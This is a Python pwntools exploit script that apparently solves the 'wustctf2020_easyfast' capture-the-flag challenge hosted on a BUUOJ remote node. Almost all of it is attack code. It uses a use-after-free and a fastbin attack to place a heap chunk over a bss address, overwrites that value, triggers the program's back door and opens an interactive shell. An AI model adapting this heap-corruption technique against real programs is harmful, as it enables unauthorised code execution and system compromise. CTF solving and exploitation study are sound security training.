from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./wustctf2020_easyfast"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 25910)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size):
    sla("choice>\n", "1")
    sla("size>\n", str(size))

def free(index):
    sla("choice>\n", "2")
    sla("index>\n", str(index))

def edit(index, con):
    sla("choice>\n", "3")
    sla("index>\n", str(index))
    s(con)

def back_door():
    sla("choice>\n", "4")


# uaf + fastbin attack

# alloc to bss 
bss = 0x0602088 
add(0x40)  # 0
free(0)
edit(0, p64(bss-0x8))

add(0x40)  # 1
add(0x40)  # 2
edit(2, p64(0))

# attack
back_door()

p.interactive()


